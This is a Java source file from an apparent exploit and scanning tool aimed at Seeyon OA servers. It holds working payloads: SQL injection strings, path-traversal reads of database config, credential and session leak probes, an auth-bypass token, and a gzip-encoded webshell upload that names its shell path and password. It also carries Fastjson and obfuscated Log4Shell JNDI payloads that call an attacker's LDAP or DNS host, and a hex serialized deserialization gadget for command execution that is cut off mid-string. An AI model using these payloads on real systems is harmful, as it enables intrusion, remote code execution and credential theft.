package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.DNSLOG;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;

import javax.swing.text.html.parser.Entity;
import java.net.MalformedURLException;
import java.util.HashMap;

/*
*  以 vul_ 为方法的开始，以便确认那些方法是漏洞
*
* */
@BasicMapping(uri = "致远")
public class SeeyonController extends Controller implements BasicController{
    public static String[] SupportVul; //初始化支持的漏洞
    public static String name = "致远";
    public SeeyonController(){

    }
    @VulnerabilityDescriptionMapping(Description="vul_信息泄露[致远OA A8 状态监控页面信息泄露\n" +
            "致远OA A6 initDataAssess.jsp 用户敏感信息泄露\n" +
            "致远OA A6 createMysql.jsp 数据库敏感信息泄露\n" +
            "致远OA A6 DownExcelBeanServlet 用户敏感信息泄露\n" +
            "致远OA getSessionList.jsp Session泄漏漏洞]\n"+
            "致远OA A6 config.jsp 敏感信息泄漏漏洞",SupportVulType= com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_信息泄露(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  vul_信息泄露");

        HashMap<String,String> CheckList = new HashMap<>();
        CheckList.put("/yyoa/assess/js/initDataAssess.jsp","personList");
        CheckList.put("/seeyon/management/status.jsp","Password");
        CheckList.put("/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"," ");
        CheckList.put("/yyoa/createMysql.jsp","root");
        CheckList.put("/yyoa/ext/trafaxserver/SystemManage/config.jsp","DatabaseName");

        switch (type) {
            case EXP:
                WriteLog("\n[*] vul_信息泄露漏洞 没有Exp");
            case POC:

                for (String key:CheckList.keySet()){
                    WriteLog("\n vul_信息泄露漏洞 "+key);
                    target = target+key;
                    HttpRequest httpRequest = new HttpRequest(target);
                    Response response = httpRequest.Get("");
                    if (response.statusCode==200 && response.responseBody.contains(CheckList.get(key))){
                        WriteLog("[*]存在");
                    }else {
                        WriteLog("[*]不存在");
                    }
                }

        }
    }

    @VulnerabilityDescriptionMapping(Description = "致远OA A6 setextno.jsp SQL注入漏洞" +
            "致远OA A6 test.jsp SQL注入漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_SqlInjection(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  致远OA A6 setextno.jsp SQL注入漏洞");

        HashMap<String,String> CheckList = new HashMap<>();
        CheckList.put("/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)","@@basedir");
        CheckList.put("/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(SELECT%20@@basedir),4#","@@basedir");
        switch (type) {
            case EXP:
                WriteLog("\n vul_信息泄露漏洞 没有Exp");
            case POC:

                for (String key:CheckList.keySet()){
                    WriteLog("\n vul_SqlInjection "+key);
                    target = target+key;
                    HttpRequest httpRequest = new HttpRequest(target);
                    Response response = httpRequest.Get("");
                    if (response.responseBody.contains(CheckList.get(key))){
                        WriteLog("[*]存在");
                    }else {
                        WriteLog("[*]不存在");
                    }
                }

        }
    }

    @VulnerabilityDescriptionMapping(Description = "致远OA getSessionList信息泄露漏洞" +
            "致远OA A6 test.jsp SQL注入漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_getSessionList(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  致远OA getSessionList信息泄露漏洞");
        String url = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll";
        switch (type) {
            case EXP:
                WriteLog("\n vul_信息泄露漏洞 没有Exp");
            case POC:
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Get("");

                if (response.statusCode == 200 && response.responseBody.contains("<Session>")){
                    WriteLog("[*] 存在漏洞");
                    WriteLog("[*] 访问链接："+target+url);
                }else {
                    WriteLog("[*] 不存在漏洞");
                }


        }
    }

    @VulnerabilityDescriptionMapping(Description = "致远OA ajax.do 登录绕过&任意文件上传",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_ajaxUpload(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  致远OA ajax.do 登录绕过&任意文件上传");

        HashMap<String,String> CheckList = new HashMap<>();
        CheckList.put("/seeyon/thirdpartyController.do.css/..;/ajax.do","java.lang.NullPointerException:null");
        HttpRequest httpRequest;
        Response response;
        switch (type) {
            case EXP:
                WriteExpLog("无需指定路径。利用成功时webshell 路径：seeyon/test133.jspx password: rebeyond");
                WriteExpLog("");
                // SHELL : seeyon/test133.jspx password: rebeyond
                String url = "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip";
                String data = "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uTY%C2%93%C2%A2H%10%7E%C3%9E%C3%BD%15%C2%84%2F%C3%9A%C3%9136%C2%82%C2%8C%C3%ADN%C3%ACC%7B%21%C2%A2%C2%A8%C2%A0%5C%1B%C3%BB%00U%C3%88a%15%C2%B0rH%C3%991%C3%BF%7D%0B%C2%B0%C2%A7%7Bb%7B%C3%AB%C2%A52%C2%B32%C2%BF%C3%8A%C3%BB%C2%AF%C3%97%C3%AE%29%C2%B9%C3%A0%029%07%C2%92z%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%B8%C2%96ts%2F%C3%8B%C2%BB%C3%AF%C3%A2y%C2%95%5E%C2%BC%2C%0B%C2%93%C2%B8%7E%C3%94%C3%B2K%18%C3%BBL%C3%AA%C3%A4%01%C3%B3%27%C3%93%C3%A9%C3%B7%C2%9F%C2%AE%C2%9E%C3%AB%C2%A4i%C3%B6%C2%94y%1EI%C3%A2%C2%A7%C3%8E%C3%B7%C3%9F%C2%99%C3%B6%C3%BC%169%C2%A5%C3%93%0F%C2%93%C3%BE%C2%8E%C2%9A%C3%A4%C3%86%25%C3%8C%C2%BD%0B%C2%93%C2%BE%C3%93%1C%05%C2%88%C2%BD%2B%C3%B3%C2%89Z%C2%AF%C3%86%7F%C3%AC%C3%94%C2%9E%0Cx%C2%BE%1Fei%C3%95y%C3%B8%09%C3%8C%C3%9C%C2%9D%C3%88%02%0F%C2%A1%C3%9A%C2%8B%C2%9D%C2%98%C3%9E%C3%80%2C%25.7f%C2%A5e%C2%90%C2%BB%C2%A2p%C3%9B%C3%A2Z%C3%86%C2%86%C3%8ERe%C3%81%2C%29%C3%97%5C%1A%40%3C%2F%00%C2%AF%17k%C2%AC%C2%94%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%B2%28.b%5B%C2%93%7C%C2%88u%028T%C2%BA%11%1Bn%C2%B4%21%C2%91%C2%A2%C3%A1%C2%B3%13%2B%C3%97-VS%C2%80%C3%B5%08%C2%8A%C2%88%C2%B35%C3%A1j%19%10I%22%C3%8A%C2%818%26%C2%B0%C3%86%C3%87%0B%C3%8E%C3%92%C2%84%01%7D%C3%8F%C3%96a%C2%925%C2%BC%C3%A9%17%16%C2%BF%12%C3%80R-%3F%C2%95Q%5C%C3%9B%C3%98%14r%28%C2%95%C2%BB%C2%A8%C3%BA%07%C3%B0%2F%C3%9FlQ%C2%8F%5CqA%2CSM%5Dn%C3%B8%28%C2%89Jf%C2%99%C3%8AMZ%1C%7D%C3%9B%0CX%C3%9B%10%C3%8E%C2%80LfT%C3%A7%06%C3%98%C2%AA%C2%B4%0C%15%C2%818%C3%97%C3%A5y%C2%ABw%10%C3%87%01%C3%85+%C2%92%C2%B8I%3D%5E%19%00J%C3%8B%C2%94%C3%9E%C3%B2%C2%83%2B4V%C2%99cl%C3%BC%3DW%05%C2%80%C3%9F%C3%B86%09B%C3%8FT%C2%91%C2%B4%C3%88%C2%A1%15%C2%A2%11%C2%8D%C2%8F%C2%85%C3%A6%C2%AA%C2%90%C2%96%C2%AD%C3%9D%1A%C2%AB%C3%88%C3%86%C2%A8%C2%B0%C2%8F-%C2%B6%2CJ%C3%99fZ%C2%85k%5C%21%17C%C3%96%C2%99%C2%9EG%27%C2%93%7D%C2%A69%C2%AD%C3%B3%7E%C2%B6%C2%8DZo%15%C3%90%1C%C3%90%C3%BC%C3%9D%C3%B3%16%2B%11%C3%80%C3%A8%0A%C3%85%0A%C3%81%C2%99p%C2%80%C3%8BU%C3%AAb%C3%A0%3B76%C2%B4%0F%C3%BB%C2%81%7D%C3%98%C2%90%C2%ADa%23%2B%C3%92%C3%8F%C3%9B%C2%834%C2%B0Bi%048%C3%BD%C3%96%C3%94+%14%C2%AE%C3%90T%0D%C3%8B%C2%A8%06%C2%B6%C3%A6%C2%87P%C2%932%C2%87%C2%9CG%7B%0E%5D%C2%9D6%C3%86%C3%B1%1B%C2%BD%C3%86%10%C3%819%C2%A2uU%03%17%2BH%C2%9E%C2%AE%26%C2%AA%C2%BE%09%C3%A5C%1E%C2%ADi%0C%C2%8E%C2%B9O6aU%C3%98%26%C3%B0%C2%8F%C2%9C%1E%C3%95%C2%B1j%C2%9C.%1C%C3%B9%09%C2%B2%C2%88%C2%9F%7C%C3%B83%C2%B6%7F%C3%BD3%C2%95%C2%89%14%C3%8AZ%23%C2%9F%C3%96%C3%B9%02%C3%84O%C3%97o%C3%B8%C3%9Ay%C3%A4b%C2%9D%C2%A7%C3%B5I%C2%A0%18%C2%A4%C2%804zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0E%12%C2%8B%08g%C2%97%C2%B5i%3E%16%C2%99%2C%0A%08%C2%92%C3%89%0D%1A%C3%83%C3%825%C3%90%C2%8D%C2%BEM%C3%B7%C2%BA%C2%B2P%22uN%C3%B3Z%C3%9E%C3%AD%C2%8A%C2%A6%3F8%15%C3%ADc%1D%C3%9B%C2%B4W%C3%A5%C3%A5%0A%01SG%C2%80%C3%9F%176%C2%A7%C2%B3G%C2%AC%C2%BF%C3%BDQ%C2%80%C2%9A%C2%A6s%C3%AB%C3%A2cB%C3%BDLi%0C4%7E%C2%B8rc%C2%85%C2%B5%0C%21%C2%A2%C3%B1Q%3F%C3%B4%0A%1A%C2%8B%0C%C2%90%C2%A0%C3%A9%C3%A9%3D7.%C2%A0%C2%A8%0F%21%C2%AD%C3%ADn%3Anz%12p%0Aq%C3%8C%09%C3%AB%C2%8A%3A%C2%BB%C2%8B%C2%AEe%5B%C3%97U%C3%A9%C3%B2%C3%BB%C3%87%C3%B79g%C2%B2%22%C3%AE%C3%A30%03%C3%BD%C3%89%C2%8B6%C3%BF6%C2%9Cy+%C2%81t%C3%94%C3%A1%C3%BDn%C2%A7%C3%BCs%C2%A5%C3%9E%7F%C2%A7%C2%BA5%C2%BB3%C2%ADm%C3%8B%C3%B4%C3%AE%C2%80%C3%BD%C3%B6%C2%9E%14%C2%A7%13%05h%C2%96%C3%80%C3%83%C2%97%C3%8E%C3%B1%C2%B0%C3%B8%C3%BA%C3%BCqI%7C%C3%9C4%C3%BD%C2%86Aq%C3%AF%23%C3%B8%C3%BF%C3%A9%02%C2%94d%1Eu%C3%AC%C3%87%C3%B7z%C3%BFP%02z%27%26%C3%8B%C2%9D%3C%04LUU%C2%BD%C2%87%C3%97%C3%AE%0F%C2%BA%1E%C3%A9%C2%8A%7C%C2%AD%C3%AF%C3%BCRx%C3%9D%C2%BF%C3%BF%05%C3%8E%C3%96%C2%AC%C2%8FY%05%00%00";
                 httpRequest = new HttpRequest(target+url);
                 response = httpRequest.Post(data);
                 if (response.responseBody.contains("message\":null")){
                     WriteExpLog("\n[*] vul_ajaxUpload 存在漏洞");
                 }else {
                     WriteExpLog("\n[*] vul_ajaxUpload 不存在漏洞");
                 }
                break;
            case POC:
                for (String key:CheckList.keySet()){
                    WriteLog("\n[*] vul_ajaxUpload "+key);
                    target = target+key;
                    httpRequest = new HttpRequest(target);
                    response = httpRequest.Get("");
                    if (response.responseBody.contains(CheckList.get(key))){
                        WriteLog("[*]存在");
                    }else {
                        WriteLog("[*]不存在");
                    }
                }
        }
    }


    @VulnerabilityDescriptionMapping(Description = "任意文件读取",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_webMailDownloadFile(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  vul_webMailDownloadFile");

        String url = "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties";
        switch (type) {
            case EXP:
                WriteLog("\n[*] vul_信息泄露漏洞 没有Exp");
                break;
            case POC:
                target = target + url;
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Post("");
                if (response.responseBody.contains("workflow") && response.statusCode==200){
                    WriteLog("\n[*] vul_webMailDownloadFile 存在漏洞");
                }else {
                    WriteLog("\n[*] vul_webMailDownloadFile 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "htmlofficeservlet 任意文件上传漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_htmlofficeservlet(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  vul_htmlofficeservlet");

        String url = "/seeyon/htmlofficeservlet";
        switch (type) {
            case EXP:
                WriteLog("\n[*] vul_htmlofficeservlet 没有写Exp");
                break;
            case POC:
                target = target + url;
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Post("");
                if (response.responseBody.contains("htmoffice") && response.responseBody.contains("DBSTEP")){
                    WriteLog("\n[*] vul_htmlofficeservlet 存在漏洞");
                }else {
                    WriteLog("\n[*] vul_htmlofficeservlet 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description = "致远OA A6 setextno.jsp SQL注入漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_setextnoSqlInjection(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  vul_setextnoSqlInjection");

        String url = "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp";
        switch (type) {
            case EXP:
                WriteLog("\n[*] vul_setextnoSqlInjection 没有写Exp");
                break;
            case POC:
                target = target + url;
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Post("");
                if (response.responseBody.contains("mysql") && response.statusCode==200){
                    WriteLog("\n[*] vul_setextnoSqlInjection 存在漏洞");
                }else {
                    WriteLog("\n[*] vul_setextnoSqlInjection 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "致远 Fastjson 远程代码执行" ,SupportVulType = com.achuna33.SupportType.SupportVul.Jndi)
    public void vul_fastjson(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        String url = "/seeyon/main.do?method=transLogout";

        HashMap<String,String> Payload = new HashMap<>();
        Payload.put("1.2.47","{\"v47\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"xxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://DNS\",\"autoCommit\":true}}");
        WriteLog("\n[*]开始检测： 致远 Fastjson 远程代码执行");
        String data = "_json_params=";
        switch (type) {
            case EXP:
                String text = "";
                if (args!=null){
                    String EXP = "{\"v47\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"xxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://DNS\",\"autoCommit\":true}}";
                    text = (String) args[0];
                    String split = text.substring(text.indexOf("//")+2);
                    data =data + EXP.replace("DNS",split);
                    target = target + url;
                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.Post(data);
                    WriteExpLog("\n[*] EXP 已发送。");

                }else {
                    WriteExpLog("\n[*] 请输入利用链");
                    return;
                }
                break;
            case POC:
                for (String key :Payload.keySet()){
                    if (Cache.uiController.DNSDomain.getText().equals("")){
                        WriteLog("[*]DNS验证类型漏洞 请配置 DNSLOG 地址");
                        return;
                    }else {
                        DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                    }
                    String domain = DNSLOG.getRandomDomain();
                    String payload =  Payload.get(key).replace("DNS",domain);
                    WriteLog("\n[*] payload:"+key +" : "+payload );
                    data = data + payload;
                    HttpRequest httpRequest = new HttpRequest(target+url);
                    httpRequest.Post(data);

                    WriteLog("[*]请自行判断：域名：" + domain);

                }
        }
    }
    @VulnerabilityDescriptionMapping(Description = "致远 Log4jShell" ,SupportVulType = com.achuna33.SupportType.SupportVul.Jndi)
    public void vul_Log4jShell(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        String payload = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://";
        WriteLog("\n[*]开始检测：  vul_Log4jShell");
        String data = "authorization=&login.timezone=GMT+8:00&province=&city=&rectangle=&login_username=";
        String url = "/seeyon/main.do?method=login";
        switch (type) {
            case EXP:
                String text = "";
                if (args!=null){

                    text = (String) args[0];
                    String split = text.substring(text.indexOf("//")+2);
                    data = data +payload+split+"}";
                    target = target + url;
                    HttpRequest httpRequest = new HttpRequest(target);
                    Response response = httpRequest.Post(data);
                    WriteExpLog("\n[*] EXP 已发送。");

                }else {
                    WriteExpLog("\n[*] 请输入利用链");
                    return;
                }
                break;
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("[*]DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();

                data = data +payload+domain+"}";
                target = target + url;
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Post(data);

                WriteLog("[*]请自行判断：域名：" + domain);
        }
    }

    @VulnerabilityDescriptionMapping(Description = "致远OA thirdpartyController任意用户登录",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_thirdpartyController(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  致远OA thirdpartyController任意用户登录");
        String data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1";
        String url = "/seeyon/thirdpartyController.do";
        switch (type) {
            case EXP:
                break;
            case POC:

                target = target + url;
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Post(data);
                Object Cookie = response.responseHeader.get("Set-Cookie");
                if (response.statusCode==200&&Cookie!=null){
                    WriteLog("\n[*]存在 致远OA thirdpartyController任意用户登录  "+Cookie.toString());
                }else {
                    WriteLog("\n[*]不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description = "致远OA SP2 wpsAssistServlet 任意文件上传",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_wpsAssistServlet(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  致远OA SP2 wpsAssistServlet 任意文件上传");
        String url = "/seeyon/wpsAssistServlet";
        switch (type) {
            case EXP:
                break;
            case POC:
                target = target + url;
                HttpRequest httpRequest = new HttpRequest(target);
                Response response = httpRequest.Get("");
                if (response.statusCode==200&& response.responseBody.contains("flag")){
                    WriteLog("\n[*]存在 致远OA 致远OA SP2 wpsAssistServlet 任意文件上传");
                }else {
                    WriteLog("\n[*]不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "致远 M3-server反序列化RCE",SupportVulType = com.achuna33.SupportType.SupportVul.RuntimeExec)
    public void vul_M3_server(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  致远 M3-server反序列化RCE");
        String url = "/mobile_portal/api/pns/message/send/batch/6_1sp1";
        String Memory_Horse = "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e00200007870000014afcafebabe0000003301050a004500890a008a008b0a008a008c0a001d008d08007a0a001b008e0a008f00900a008f009107007b0a008a00920800930a002000940800950800960700970800980800580700990a001b009a08009b08007007009c0b0016009d0b0016009e08006708009f0700a00a001b00a10700a20a00a300a40800a50700a60800a70a002000a80800a909002500aa0700ab0a002500ac0800ad0a00ae00af0a002000b00800b10800b20800b30800b40800b50700b60700b70a003000b80a003000b90a00ba00bb0a002f00bc0800bd0a002f00be0a002f00bf0a002000c00800c10a001b00c20a001b00c30800c40700640a001b00c50800c60700c70800c80800c90700ca0701030700cc0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301002c4c79736f73657269616c2f7061796c6f6164732f74656d706c617465732f546f6d636174436d644563686f3b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700cd0100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e010001650100204c6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e3b010003636c730100114c6a6176612f6c616e672f436c6173733b010004766172350100214c6a6176612f6c616e672f4e6f537563684d6574686f64457863657074696f6e3b010004636d64730100135b4c6a6176612f6c616e672f537472696e673b010006726573756c740100025b4201000970726f636573736f720100124c6a6176612f6c616e672f4f626a6563743b010003726571010004726573700100016a01000149010001740100124c6a6176612f6c616e672f5468726561643b0100037374720100124c6a6176612f6c616e672f537472696e673b0100036f626a01000a70726f636573736f72730100104c6a6176612f7574696c2f4c6973743b0100154c6a6176612f6c616e672f457863657074696f6e3b01000169010004666c61670100015a01000567726f75700100174c6a6176612f6c616e672f54687265616447726f75703b010001660100194c6a6176612f6c616e672f7265666c6563742f4669656c643b010007746872656164730100135b4c6a6176612f6c616e672f5468726561643b01000d537461636b4d61705461626c650700ce0700cf0700d00700a60700a207009907009c0700620700c70700ca01000a536f7572636546696c65010012546f6d636174436d644563686f2e6a6176610c004600470700d00c00d100d20c00d300d40c00d500d60c00d700d80700cf0c00d900da0c00db00dc0c00dd00de010004657865630c00df00e0010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c00e100d6010006676c6f62616c01000e6a6176612f7574696c2f4c6973740c00e200e30c00db00e401000b676574526573706f6e736501000f6a6176612f6c616e672f436c6173730c00e500e60100106a6176612f6c616e672f4f626a6563740700e70c00e800e90100096765744865616465720100106a6176612f6c616e672f537472696e67010003636d640c00ea00eb0100097365745374617475730c00ec005e0100116a6176612f6c616e672f496e74656765720c004600ed0100076f732e6e616d650700ee0c00ef00f00c00f100de01000377696e010007636d642e6578650100022f630100092f62696e2f626173680100022d630100116a6176612f7574696c2f5363616e6e65720100186a6176612f6c616e672f50726f636573734275696c6465720c004600f20c00f300f40700f50c00f600f70c004600f80100025c410c00f900fa0c00fb00de0c00fc00fd0100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b0c00fe00ff0c0100010101000873657442797465730c010200e6010007646f577269746501001f6a6176612f6c616e672f4e6f537563684d6574686f64457863657074696f6e0100136a6176612e6e696f2e42797465427566666572010004777261700100136a6176612f6c616e672f457863657074696f6e01002a79736f73657269616c2f7061796c6f6164732f74656d706c617465732f546f6d636174436d644563686f010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c6574010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e0100156a6176612f6c616e672f54687265616447726f75700100176a6176612f6c616e672f7265666c6563742f4669656c640100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000d6765745375706572636c61737301000473697a650100032829490100152849294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076973456d70747901000328295a01000454595045010004284929560100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f77657243617365010016285b4c6a6176612f6c616e672f537472696e673b2956010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b295601000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b0100046e657874010008676574427974657301000428295b42010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000b6e6577496e7374616e636501001428294c6a6176612f6c616e672f4f626a6563743b0100116765744465636c617265644d6574686f6401003979736f73657269616c2f7061796c6f6164732f74656d706c617465732f546f6d636174436d644563686f39383334393531333839303130323301003b4c79736f73657269616c2f7061796c6f6164732f74656d706c617465732f546f6d636174436d644563686f3938333439353133383930313032333b002100440045000000000004000100460047000100480000002f00010001000000052ab70001b100000002004900000006000100000009004a0000000c000100000005004b010400000001004d004e000200480000003f0000000300000001b100000002004900000006000100000057004a00000020000300000001004b0104000000000001004f0050000100000001005100520002005300000004000100540001004d005500020048000000490000000400000001b10000000200490000000600010000005c004a0000002a000400000001004b0104000000000001004f005000010000000100560057000200000001005800590003005300000004000100540008005a004700010048000005d500080011000002fd033bb80002b600034c2bb600041205b600064d2c04b600072c2bb60008c00009c000094e03360415042dbea202cd2d1504323a051905c70006a702b91905b6000a3a061906120bb6000c9a000d1906120db6000c9a0006a7029b1905b60004120eb600064d2c04b600072c1905b600083a071907c1000f9a0006a702781907b600041210b600064d2c04b600072c1907b600083a071907b600041211b600064da700163a081907b60004b60013b600131211b600064d2c04b600072c1907b600083a071907b60004b600131214b600064da700103a081907b600041214b600064d2c04b600072c1907b600083a071907b600041215b600064d2c04b600072c1907b60008c00016c000163a0803360915091908b900170100a201cb19081509b9001802003a0a190ab600041219b600064d2c04b600072c190ab600083a0b190bb60004121a03bd001bb6001c190b03bd001db6001e3a0c190bb60004121f04bd001b5903122053b6001c190b04bd001d5903122153b6001ec000203a061906c601571906b600229a014f190cb60004122304bd001b5903b2002453b6001c190c04bd001d5903bb0025591100c8b7002653b6001e571227b80028b60029122ab6000c99001906bd00205903122b535904122c535905190653a7001606bd00205903122d535904122e5359051906533a0dbb002f59bb003059190db70031b60032b60033b700341235b60036b60037b600383a0e1239b8003a3a0f190fb6003b3a07190f123c06bd001b5903123d535904b20024535905b2002453b6003e190706bd001d5903190e535904bb00255903b70026535905bb002559190ebeb7002653b6001e57190cb60004123f04bd001b5903190f53b6001c190c04bd001d5903190753b6001e57a7004e3a0f1241b8003a3a1019101242